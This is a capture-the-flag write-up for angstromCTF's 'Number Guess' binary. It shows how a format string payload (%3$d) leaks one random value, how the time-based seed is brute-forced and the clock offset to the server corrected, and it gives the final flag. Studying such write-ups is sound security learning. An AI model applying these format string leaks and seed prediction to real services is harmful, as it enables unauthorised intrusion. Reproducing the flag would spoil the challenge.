# Number Guess
binary - 70 points

## Challenge 
Ian loves playing number guessing games, so he went ahead and [wrote one himself](guessPublic64)([source](guessPublic.c)). I hope it doesn't have any vulns. The service is running at `nc shell.angstromctf.com 1235`.

## Hint
Look up some vulnerabilities associated with the printf function.

## Solution

Format string attack

(I created modded.c to print out the rand values)

	# echo '%d %d %d %d %d %d %d %d %d %d %d %d %d %d' | ./modded 
	Welcome to the number guessing game!
	Before we begin, please enter your name (40 chars max): 
	I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
	457774668 1041 820441 -1290305372 -1290305248 457774984 0 1891806096 1891805296 457774976 820441 1891806096 -1293946191's guess: Sorry, the answer was 1712334 (891893 + 820441). Try again :(

Hence we can get rand2 using format string: `%3$d`.

But we realise we can only get `rand2` and not `rand1`.

---

Apparently the server is not running on the current time of my PC hence we can't just generate 2 random numbers on our own PC and feed it into the server.

With this, in `payload.c` I first made an OFFSET of 0 and feed in the payload to get the rand2 along with my current seed on my PC (using `printf("%%3$d Seed of %d\n", seed)` as payload).

	# gcc payload.c -o payload
	# ./payload  |  nc shell.angstromctf.com 1235
	Welcome to the number guessing game!
	Before we begin, please enter your name (40 chars max): 
	I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
	947848 Seed of 1521353782's guess: Sorry, the answer was 1297319. Try again :(

Hence, `rand1 = 1297319 - 947848`.

Insert this as the `FIND_VALUE` into `bruteforce_seed.c`

---

	$ ./bruteforce_seed 
	Seed: 1521353773
	Solved!
	Result: 1521353773

Now get got the seed, we can find the difference between our current time and the server time.

Compare to our initial to get an time offset value of `(1521353782 - 1521353773)`.

---

Adjust OFFSET inside `payload.c` and feed the output into the server!

	 # gcc payload.c -o payload
	 # ./payload  |  nc shell.angstromctf.com 1235
	Welcome to the number guessing game!
	Before we begin, please enter your name (40 chars max): 
	I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
	244398 Seed of 1521353842's guess: 
	Congrats, here's a flag: actf{format_stringz_are_pre77y_sc4ry}

## Flag

	actf{format_stringz_are_pre77y_sc4ry}
